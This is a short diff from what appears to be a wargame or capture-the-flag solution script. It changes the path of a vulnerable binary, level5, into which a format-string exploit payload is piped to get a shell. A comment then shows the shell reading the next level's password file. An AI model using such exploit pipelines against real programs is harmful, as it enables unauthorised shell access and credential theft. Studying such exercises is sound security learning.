@@ -67,7 +67,7 @@ PRINTF_ADDRESSES="${PRINTF_ADDRESS_0}${PRINTF_ADDRESS_1}${PRINTF_ADDRESS_2}${PRI
 
 # We print our exploit to the input to get the reverse shell
 INPUT="${PRINTF_PAYLOAD}${PRINTF_ADDRESSES_ALIGNMENT}${PRINTF_ADDRESSES}"
-(echo "${INPUT}" && cat) | ./level5
+(echo "${INPUT}" && cat) | /home/user/level5/level5
 
 # We use the reverse shell to retrieve the password
 # $> cat /home/user/level6/.pass
